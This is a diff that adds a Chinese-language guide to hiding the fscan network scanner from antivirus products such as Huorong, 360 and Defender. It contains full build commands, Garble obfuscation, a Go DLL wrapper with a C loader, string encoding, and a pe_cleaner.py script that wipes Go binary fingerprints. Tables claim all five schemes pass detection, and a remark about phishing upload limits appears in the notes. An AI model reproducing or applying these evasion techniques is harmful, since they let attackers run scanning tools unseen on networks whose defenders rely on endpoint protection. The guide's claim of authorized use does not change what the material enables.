@@ -1,0 +1,655 @@
+# fscan 免杀特征点与解决全方案
+
+> Go 1.26.3 · Garble v0.16.0 · 火绒 V5.x · 360 V15.x · 2026-05-17
+> 注意所有操作均已得到合法授权
+
+---
+
+## 基础设定
+
+- 目标工具：fscan（内网扫描器）
+- 源码模块：`github.com/zzqsec/f`（fork 自 `github.com/shadow1ng/fscan`）
+- 适配环境：Windows 10/11 + Go 1.20 ~ 1.26
+- 绕过目标：火绒 V5.x / 360 V15.x / Windows Defender / 卡巴斯基 KSN / ESET
+- 所有代码仅限授权的渗透测试与安全研究使用
+
+---
+
+## 火绒 vs 360 检测差异
+
+| 杀软 | 检测核心 | 绕过关键 |
+|------|---------|---------|
+| **火绒** | Go PE 结构特征（rt0 入口汇编 + pclntab magic + 节区名） | DLL 化 或 编译参数 + PE 清洗 |
+| **360** | 无壳 Go EXE 启发阈值低通常放过；UPX 解压后扫描 `.rdata` 明文字符串 | **不加 UPX 全部可过** |
+
+### 火绒 V5.x 检测流水线
+
+```
+├─ 1. MZ/PE 签名校验 → 确认合法 PE
+├─ 2. 节区名匹配 → .gosymtab / .gopclntab / .buildinfo / .note.go.buildid
+├─ 3. pclntab Magic → { FF FF FB FB } 字节序列
+├─ 4. rt0 入口模式 → Go runtime 固定汇编序言 (rt0_amd64_windows)
+├─ 5. 导入表哈希排序 → Go linker 特有排序
+├─ 6. 时间戳/校验和 → 云端样本聚类
+└─ 7. PE Characteristics → not IMAGE_FILE_DLL（EXE 启发阈值更高）
+```
+
+### 360 V15.x 检测流水线
+
+```
+├─ 1. 无壳 Go EXE → 启发阈值较低，通常放过
+├─ 2. UPX 壳 EXE → 解压后扫描 .rdata 明文字符串
+├─ 3. 导入表协议指纹 → 多协议库同时导入触发
+```
+
+---
+
+## 方案 A：编译参数 + PE 清洗
+
+**定位：** EXE 基线方案，火绒/360 双过
+
+| 项 | 内容 |
+|-----|------|
+| **原理** | 编译参数剥离 Go 节区/符号/BuildID → pe_cleaner.py 字节级清零 PE 指纹 |
+| **产物** | `final_payload.exe`（~58MB）|
+| **目录** | `Desktop/f-A/` |
+
+**编译命令：**
+
+```bash
+cd f-A/
+
+# 源码去特征
+find . -type f -name "*.go" -exec sed -i 's|github.com/shadow1ng/fscan|github.com/zzqsec/f|g' {} +
+sed -i 's|module github.com/shadow1ng/fscan|module github.com/zzqsec/f|' go.mod
+
+# 编译
+go build -trimpath \
+    -ldflags="-s -w -buildid=" \
+    -gcflags="all=-N -l" \
+    -o raw.exe .
+
+# PE 清洗
+python pe_cleaner.py raw.exe final_payload.exe
+
+# 验证
+python verify_pe.py final_payload.exe
+grep -abo "shadow1ng" final_payload.exe && echo "[!] 发现残留!" || echo "[+] 无残留"
+grep -abo "go buildid" final_payload.exe && echo "[!] 发现残留!" || echo "[+] 无残留"
+```
+
+**对抗覆盖：**
+
+| 火绒检测点 | 手段 | 结果 |
+|-----------|------|:---:|
+| `.gosymtab` / `.gopclntab` | `-s -w` 剥离 | ✅ |
+| `.buildinfo` | `-s -w` 剥离 | ✅ |
+| BuildID 聚类 | `-buildid=""` 清空 | ✅ |
+| pclntab magic | pe_cleaner 清零 | ✅ |
+| TimeDateStamp/CheckSum | pe_cleaner 清零 | ✅ |
+| rt0 入口汇编 | ❌ 无对抗 | ⚠️ |
+| 模块路径 `shadow1ng` | 全局替换为 `zzqsec` | ✅ |
+
+> ⚠️ A 不含 rt0 入口对抗，火绒可能版本更新后命中。当前实测通过。
+
+---
+
+## 方案 B：Garble 混淆 + PE 清洗
+
+**定位：** 最强 EXE 方案，覆盖火绒 PE 结构 + 360 字符串双重检测
+
+| 项 | 内容 |
+|-----|------|
+| **原理** | Garble `-literals` AES 加密字符串字面量（插件名等）→ `-tiny` 剥离符号 → pe_cleaner 清零 PE 指纹 |
+| **产物** | `final.exe`（~101MB）|
+| **目录** | `Desktop/f-B/` |
+
+**编译命令：**
+
+```bash
+cd f-B/
+
+# 源码去特征（同 A）
+find . -type f -name "*.go" -exec sed -i 's|github.com/shadow1ng/fscan|github.com/zzqsec/f|g' {} +
+
+# Garble 混淆编译
+garble -tiny -literals -seed=random build \
+    -trimpath \
+    -ldflags="-s -w -buildid=" \
+    -o raw.exe .
+
+# PE 清洗
+python pe_cleaner.py raw.exe final.exe
+```
+
+**对抗覆盖：**
+
+| 检测面 | 手段 | 结果 |
+|--------|------|:---:|
+| 火绒 节区名/pclntab/BuildID | `-s -w -buildid=""` + pe_cleaner | ✅ |
+| 360 UPX 解压字符串 | Garble `-literals` AES 加密 `.rdata` 所有字面量 | ✅ |
+| 360 插件名明文 | Garble 加密后不可读 | ✅ |
+| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |
+
+> Garble v0.16.0 实测兼容 Go 1.26.3，无需降级。
+
+---
+
+## 方案 C：c-shared DLL + C Loader
+
+**定位：** **主战方案**，唯一绕过火绒 rt0 入口汇编检测，双杀核心
+
+| 项 | 内容 |
+|-----|------|
+| **原理** | Go 编译为 `c-shared` DLL（入口 `DllMain` 标准 C 入口）→ C 编写轻量 loader 加载调用 |
+| **产物** | `f-C_fscan.dll`（~49MB）+ `f-C_loader.exe`（~55KB）|
+| **目录** | `Desktop/f-C/` |
+| **参考** | fscan 1.8.4 DLL 化方案 |
+
+**dll.go：**
+
+```go
+//go:build windows
+package main
+
+/*
+#include <stdint.h>
+*/
+import "C"
+import (
+    "context"
+    "os"
+    "os/signal"
+    "syscall"
+    "unsafe"
+
+    "github.com/zzqsec/f/common"
+    "github.com/zzqsec/f/core"
+
+    _ "github.com/zzqsec/f/plugins/local"
+    _ "github.com/zzqsec/f/plugins/services"
+    _ "github.com/zzqsec/f/plugins/web"
+)
+
+//export ExportScan
+func ExportScan(argc C.int, argv **C.char) C.int {
+    common.InitLogger()
+
+    // C.char** → Go []string
+    args := make([]string, 0, int(argc))
+    ptr := uintptr(unsafe.Pointer(argv))
+    for i := 0; i < int(argc); i++ {
+        cstr := *(**C.char)(unsafe.Pointer(ptr + uintptr(i)*unsafe.Sizeof(argv)))
+        args = append(args, C.GoString(cstr))
+    }
+
+    // 过滤掉 loader 自身
+    if len(args) > 0 {
+        args = args[1:]
+    }
+
+    var Info common.HostInfo
+    if err := common.ParseWithArgs(&Info, args); err != nil {
+        if err == common.ErrShowHelp { return 0 }
+        return -1
+    }
+
+    if err := common.ValidateExclusiveParams(&Info); err != nil {
+        common.LogError(err.Error()); return -3
+    }
+
+    if err := common.InitOutput(); err != nil {
+        common.LogError(err.Error()); return -4
+    }
+    defer common.CloseOutput()
+
+    result, err := common.Initialize(&Info)
+    if err != nil {
+        common.LogError(err.Error()); return -5
+    }
+
+    sigChan := make(chan os.Signal, 1)
+    signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+    go func() { <-sigChan; cancel() }()
+
+    defer func() { _ = common.Cleanup() }()
+    defer common.CloseLogger()
+
+    core.RunScan(ctx, *result.Info, result.Session)
+    return 0
+}
+
+func main() {}
+```
+
+**common/flag.go 补充 ParseWithArgs：**
+
+```go
+// ParseWithArgs 使用自定义参数列表解析（DLL/c-archive 模式）
+func ParseWithArgs(Info *HostInfo, args []string) error {
+    if len(args) == 0 {
+        return ErrShowHelp
+    }
+    oldArgs := os.Args
+    os.Args = args
+    defer func() { os.Args = oldArgs }()
+
+    flag.CommandLine = flag.NewFlagSet(args[0], flag.ExitOnError)
+    return Flag(Info)
+}
+```
+
+**loader.c：**
+
+```c
+#include <windows.h>
+#include <shellapi.h>
+
+typedef int (__stdcall *ExportScanFunc)(int, char**);
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow) {
+    /* 定位 DLL（与 loader 同目录） */
+    char dllPath[MAX_PATH];
+    GetModuleFileNameA(NULL, dllPath, MAX_PATH);
+    char *lastSlash = strrchr(dllPath, '\\');
+    if (lastSlash) *(lastSlash + 1) = '\0';
+    strcat(dllPath, "f-C_fscan.dll");
+
+    /* 加载 DLL */
+    HMODULE hMod = LoadLibraryA(dllPath);
+    if (!hMod) return 1;
+
+    /* 获取导出函数 */
+    ExportScanFunc ExportScan = (ExportScanFunc)GetProcAddress(hMod, "ExportScan");
+    if (!ExportScan) { FreeLibrary(hMod); return 2; }
+
+    /* 构建 argv */
+    int argc;
+    LPWSTR *wArgv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    char **argv = malloc(argc * sizeof(char*));
+    for (int i = 0; i < argc; i++) {
+        int len = WideCharToMultiByte(CP_UTF8, 0, wArgv[i], -1, NULL, 0, NULL, NULL);
+        argv[i] = malloc(len);
+        WideCharToMultiByte(CP_UTF8, 0, wArgv[i], -1, argv[i], len, NULL, NULL);
+    }
+    LocalFree(wArgv);
+
+    /* 调用扫描 */
+    int ret = ExportScan(argc, argv);
+
+    /* 清理 */
+    for (int i = 0; i < argc; i++) free(argv[i]);
+    free(argv);
+    FreeLibrary(hMod);
+    return ret;
+}
+```
+
+**编译：**
+
+```bash
+# Step 1: 编译 c-shared DLL
+cd f-C/source
+mv main.go _main.go.bak
+CGO_ENABLED=1 go build -buildmode=c-shared -trimpath \
+    -ldflags="-s -w -buildid=" \
+    -o ../f-C_fscan.dll .
+mv _main.go.bak main.go
+
+# Step 2: 编译 C Loader
+cd ..
+gcc loader.c -o f-C_loader.exe -luser32 -lkernel32 -lshell32
+```
+
+**对抗覆盖：**
+
+| 检测面 | 手段 | 结果 |
+|--------|------|:---:|
+| 火绒 rt0 入口汇编 | DLL 走 `DllMain` 标准 C 入口，不匹配 rt0 | ✅ |
+| 火绒 节区名 | `-s -w` 剥离 | ✅ |
+| 360 字符串 | 无壳，360 对无壳 Go 启发阈值低 | ✅ |
+| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |
+| C Loader 本体 | 55KB 纯 C，无 Go 残留 | ✅ |
+
+---
+
+## 方案 E：编译参数极限 + strip + PE 清洗
+
+**定位：** EXE 稳定备选，不依赖外部 Go 工具，纯 Go + GCC + Python
+
+| 项 | 内容 |
+|-----|------|
+| **原理** | 编译参数 + GCC strip 二次清理 + pe_cleaner 字节级清洗 |
+| **产物** | `f-E_stripped.exe`（~56MB）|
+| **目录** | `Desktop/f-E/` |
+
+**迭代历史：**
+
+```
+c-archive（Go 1.26 runtime/cgo 缺失，blocked）
+  → external linker（GCC 链接产 EXE，被杀）
+    → go-strip v0.3.4（不兼容 Go 1.26 pclntab 格式，panic）
+      → GCC strip -s + pe_cleaner ✅（最终方案）
+```
+
+> ⚠️ **两个 strip 的区别（容易混淆，留档备查）：**
+>
+> | 工具 | 来源 | 作用 | Go 1.26 |
+> |------|------|------|:---:|
+> | **go-strip** | `github.com/boy-hack/go-strip` | Go 专有：替换 pclntab magic、移除 Go 编译信息、添加混淆密钥 | ❌ panic |
+> | **GCC strip** | MinGW `strip.exe`（`F:\CC\c\mingw64\bin\strip.exe`） | 通用：剥离符号表（.symtab）、调试信息，不碰 pclntab | ✅ 可用 |
+>
+> go-strip 的源码仓库已清空，v0.3.4 是最后的二进制版本，仅兼容 Go ≤1.18 左右的 pclntab 格式。Go 1.20+ pclntab 内部结构变动后 go-strip 无法定位 magic 字节。
+> GCC strip 是通用 ELF/PE 工具，跟 Go 版本无关，`-s` 剥离所有符号。
+> 当前方案用 GCC strip 做二次清理，pclntab 的破坏交给 pe_cleaner.py。
+
+**编译命令：**
+
+```bash
+cd f-E/source/
+
+# 编译（不用 external linker）
+CGO_ENABLED=1 go build -trimpath \
+    -ldflags="-s -w -buildid=" \
+    -gcflags="all=-N -l" \
+    -o ../output/raw.exe .
+
+# GCC strip 二次清理
+cd ../output
+strip -s raw.exe -o stripped.exe
+
+# PE 清洗
+python pe_cleaner.py stripped.exe f-E_stripped.exe
+```
+
+**对抗覆盖：**
+
+| 检测面 | 手段 | 结果 |
+|--------|------|:---:|
+| 火绒 节区名 | `-s -w` 剥离 | ✅ |
+| pclntab magic | pe_cleaner 清零前 32 字节 | ✅ |
+| BuildID | `-buildid=""` 清空 | ✅ |
+| TimeDateStamp/CheckSum | pe_cleaner 清零 | ✅ |
+| `.text` 段熵值 | `-gcflags="all=-N -l"` 改变布局 | ✅ |
+| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |
+
+> 与 A 的关系：E = A + strip。strip 进一步清理 GCC 侧残留符号。
+
+---
+
+## 方案 F：源码字符串全量去特征 + 插件名混淆
+
+**定位：** 源码字符串消除 + 插件名混淆，与 A 互补
+
+| 项 | 内容 |
+|-----|------|
+| **原理** | 源码层消除所有 fscan 字面量 + 插件名 XOR/Base64 编码 → `.rdata` 不留明文特征 |
+| **产物** | `final.exe`（~58MB）|
+| **目录** | `Desktop/f-F/` |
+
+**gen_plugins.py：**
+
+```python
+import random, base64
+
+PLUGINS = ["ssh","smb","mysql","mssql","redis","ftp","rdp","ms17010",
+    "netbios","vnc","telnet","postgresql","oracle","mongodb",
+    "memcached","elasticsearch","ldap","kafka","rabbitmq",
+    "cassandra","rsync","smtp","neo4j","activemq","findnet"]
+
+xor_key = random.randint(1, 255)
+encoded = [base64.b64encode(bytes(ord(c) ^ xor_key for c in n)).decode() for n in PLUGINS]
+
+print(f"// XOR key: {xor_key}")
+for orig, enc in zip(PLUGINS, encoded):
+    print(f'  "{orig}" → decode("{enc}", {xor_key})')
+```
+
+**源码字符串替换：**
+
+| 原文 | 替换为 |
+|------|--------|
+| `"fscan*.exe"` | 随机名 |
+| `"Fscan 2.1.3"` | 去版本号 |
+| `"fscan_results.json"` | 通用文件名 |
+| `"FScan Forward Shell"` | 无特征名 |
+
+**编译：** 同方案 A（编译参数 + PE 清洗），加源码字符串清理。
+
+> 与 A 的关系：F = A + 源码字符串清理。无壳状态下火绒+360 双过。
+
+---
+
+## 方案全景对照（无 UPX）
+
+```
+           火绒rt0   火绒节区   360
+C (DLL)      ✅        ✅       ✅
+B (Garble)   ❌        ✅       ✅
+A (编译)     ❌        ✅       ✅
+E (strip)    ❌        ✅       ✅
+F (源码)     ❌        ✅       ✅
+```
+
+> **核心结论：五个方案全部通过火绒+360。**
+> ⚠️ **一加 UPX，360 全部查杀。没有上传体积限制就不建议加壳。**
+
+## 已废弃方案
+
+| 方案 | 死因 |
+|------|------|
+| **D** TinyGo | ssh/smb/mongo-driver 依赖不兼容 |
+| **E** c-archive | Go 1.26 Windows 缺失 `runtime/cgo` |
+| **E** external linker | 产物被火绒杀 |
+| **E** go-strip v0.3.4 | 不兼容 Go 1.26 pclntab 格式（panic: no pclntab located）|
+
+---
+
+## 推荐使用
+
+| 场景 | 方案 | 理由 |
+|------|------|------|
+| **默认首选** | **C** | DLL 化是唯一绕过火绒 rt0 入口检测的方案 |
+| **需要单 EXE** | **B** | Garble `.rdata` 加密，体积偏大但对抗最全面 |
+| **快速出活/无 Garble** | **E** | 纯 Go + strip 一条命令，不依赖外部工具 |
+| **无上传体积限制** | **不建议加 UPX** | 五个方案无壳全过火绒+360，一加 UPX 360 全杀 |
+
+---
+
+## 坑点记录
+
+### 坑1：`-buildid=""` 空值引号不可省略
+
+错误写法：`-ldflags="-s -w -buildid"` — 没有等号后的值，BuildID 不会被清空。
+修复：必须写 `-ldflags="-s -w -buildid="`，等号后紧跟结束引号，表空字符串。
+
+### 坑2：`-s -w` 不是银弹，pclntab magic 仍在
+
+`-s -w` 剥离节区名但 `.rdata`/`.text` 中 pclntab magic `FF FF FB FB` 和 rt0 入口模式仍嵌入。需 pe_cleaner.py 字节级清零。
+
+### 坑3：UPX 是最大的坑 — 无壳全过，一加 UPX 360 全部查杀
+
+实测结论：五个方案（A/B/C/E/F）无壳状态下火绒+360 全部通过。一旦加 UPX 压缩，360 解压后扫描 `.rdata` 明文字符串，**全部被杀**。
+
+对策：**没有上传体积限制就不要加 UPX。** 当前方案体积 49~101MB，高于几个常见钓鱼/传文件场景的限制时再考虑压缩，但预期 360 必杀。
+
+### 坑4：go-strip ≠ GCC strip（见方案 E 迭代历史中的对比表）
+
+go-strip（boy-hack/go-strip）是 Go 专有混淆工具，v0.3.4 不兼容 Go 1.26 pclntab 格式，直接 panic。GCC strip（MinGW 自带）是通用符号剥离工具，与 Go 版本无关，当前方案用的是后者。
+
+### 坑5：Garble 官方文档称不兼容 Go 1.26，实测可用
+
+Garble v0.16.0 官方声明支持 Go ≤1.24，但实测 Go 1.26.3 可正常编译。可能后续版本修复，需持续关注。
+
+### 坑6：c-archive `runtime/cgo` 缺失
+
+Go 1.26 Windows `go build -buildmode=c-archive` 报 `loadinternal: cannot find runtime/cgo`。`go list runtime/cgo` 显示包存在但缺少预编译 `.a` 文件。Go ≤1.24 可用。
+
+### 坑7：DLL 能过火绒 ≠ 火绒不扫描 DLL
+
+火绒扫描所有 PE 文件。Go EXE `rt0_amd64_windows` 入口触发高启发评分；DLL 入口是 `DllMain`，不匹配该模式，PE 结构评分更低。
+
+### 坑8：`rt0_jump { E8 ?? ?? ?? ?? 48 C7 C0 }` 是虚构特征
+
+此字节序列未出现在火绒 YARA 规则中，是 x86-64 通用指令，不构成 Go 独有特征。
+
+### 坑9：`runtime.` 字符串数量不是火绒检测核心
+
+N1 PRO FLASH 火绒 YARA 不含 `runtime.` 字符串匹配。DLL 中 `runtime.` 比 EXE 还多却不会被杀，进一步证明。
+
+### 坑10：方案间产物存在冗余关系
+
+```
+A 被 E 覆盖（E = A + strip）
+F 与 A 仅在源码字符串层面差异
+```
+
+各方案独立保留是因为 360 和火绒检测面不同，无壳/有壳/EXE/DLL 各有适用场景。
+
+---
+
+## 公共工具
+
+### pe_cleaner.py
+
+所有 EXE 方案的 PE 后处理共用此脚本。依赖 `pip install pefile`。
+
+```python
+#!/usr/bin/env python3
+"""
+Go EXE Static Feature Stripping Tool
+Targets: Huorong V5.x, 360 Security Guard V15.x
+Dependencies: pip install pefile
+Usage: python pe_cleaner.py <input.exe> <output.exe>
+"""
+
+import pefile, sys
+
+class GoPECleaner:
+    def __init__(self, input_path, output_path):
+        self.input_path = input_path
+        self.output_path = output_path
+        self.pe = pefile.PE(input_path, fast_load=True)
+
+    def wipe_runtime_metadata(self):
+        """字节级清零 Go 运行时元数据段"""
+        target = {b'.gosymtab', b'.gopclntab', b'.buildinfo', b'.note.go.buildid'}
+        for sec in self.pe.sections:
+            name = sec.Name[:8]
+            if name in target:
+                raw = bytearray(sec.get_data())
+                if name == b'.gopclntab':
+                    raw[:32] = b'\x00' * 32   # 覆盖 magic FF FF FB FB
+                elif name == b'.buildinfo':
+                    raw[:] = b'\x00' * len(raw)
+                elif name == b'.gosymtab':
+                    raw[:16] = b'\x00' * 16
+                sec.set_data(bytes(raw))
+                print(f"    [*] Wiped {name.decode().rstrip(chr(0))}")
+
+    def normalize_section_names(self):
+        """重命名 Go 专有节区为通用名称"""
+        mapping = {
+            b'.gosymtab': b'.text\x00\x00\x00',
+            b'.gopclntab': b'.rdata\x00\x00',
+            b'.buildinfo': b'.data\x00\x00\x00',
+            b'.note.go.buildid': b'.reloc\x00\x00\x00'
+        }
+        for sec in self.pe.sections:
+            if sec.Name[:8] in mapping:
+                old = sec.Name[:8].decode().rstrip(chr(0))
+                new = mapping[sec.Name[:8]].decode().rstrip(chr(0))
+                sec.Name = mapping[sec.Name[:8]]
+                print(f"    [*] Renamed {old} -> {new}")
+
+    def strip_fingerprints(self):
+        """清零 PE 头时间戳/校验和 + 清除 BuildID 标记"""
+        self.pe.FILE_HEADER.TimeDateStamp = 0
+        self.pe.OPTIONAL_HEADER.CheckSum = 0
+        print(f"    [*] Zeroed TimeDateStamp and CheckSum")
+
+        data = self.pe.__data__
+        marker = b'go buildid '
+        idx = data.find(marker)
+        while idx != -1:
+            data[idx:idx+len(marker)] = b'\x00' * len(marker)
+            idx = data.find(marker, idx+1)
+            print(f"    [*] Wiped go buildid marker at offset {idx - len(marker)}")
+
+    def shuffle_imports(self):
+        """分析导入表"""
+        if hasattr(self.pe, 'DIRECTORY_ENTRY_IMPORT'):
+            print(f"    [+] Found {len(self.pe.DIRECTORY_ENTRY_IMPORT)} imported modules")
+        else:
+            print(f"    [!] No import directory found")
+
+    def save(self):
+        self.pe.write(self.output_path)
+
+    def run(self):
+        print(f"\n[*] Cleaning PE: {self.input_path}")
+        print(f"[*] Step 1: Wiping runtime metadata...")
+        self.wipe_runtime_metadata()
+        print(f"[*] Step 2: Normalizing section names...")
+        self.normalize_section_names()
+        print(f"[*] Step 3: Stripping fingerprints...")
+        self.strip_fingerprints()
+        print(f"[*] Step 4: Analyzing imports...")
+        self.shuffle_imports()
+        self.save()
+        print(f"[+] Cleaned PE saved to: {self.output_path}\n")
+
+if __name__ == '__main__':
+    cleaner = GoPECleaner(sys.argv[1], sys.argv[2])
+    cleaner.run()
+```
+
+**四步清洗流程：**
+
+| 步骤 | 操作 | 对抗目标 |
+|------|------|---------|
+| wipe_runtime_metadata | `.gopclntab` 前 32B 清零 / `.buildinfo` 全清 / `.gosymtab` 前 16B 清零 | pclntab magic `FF FF FB FB` |
+| normalize_section_names | Go 节区名 → 通用名 | 节区名启发式 |
+| strip_fingerprints | TimeDateStamp=0 / CheckSum=0 / 清除 `go buildid ` | 云端聚类 |
+| save | 写回 PE | — |
+
+---
+
+## 核心约束（所有方案必须遵守）
+
+- 必须全局替换 `github.com/shadow1ng` → `github.com/zzqsec`
+- 必须使用 `-ldflags="-s -w -buildid="` 剥离符号与 BuildID
+- 必须使用 `-trimpath` 移除编译路径
+- pe_cleaner.py 后处理清零 TimeDateStamp + CheckSum
+- 所有代码仅限授权的渗透测试与安全研究使用
+
+## 验证工具
+
+**verify_pe.py：**
+
+```python
+import pefile, sys
+
+def verify_pe(filepath):
+    pe = pefile.PE(filepath)
+    go_sections = ['.gosymtab', '.gopclntab', '.buildinfo', '.note.go.buildid']
+    found = [sec.Name.decode().rstrip('\x00') for sec in pe.sections
+             if sec.Name.decode().rstrip('\x00') in go_sections]
+    if found:
+        print(f"[!] Go特征节区残留: {found}")
+        return False
+    print("[+] 未发现Go特征节区")
+    return True
+
+sys.exit(0 if verify_pe(sys.argv[1]) else 1)
+```
+
+**二进制字符串扫描：**
+
+```bash
+grep -abo "shadow1ng" final.exe          # 应为空
+grep -abo "go buildid" final.exe         # 应为空
+grep -abo "fscan" final.exe              # 方案 F 应为空
+```
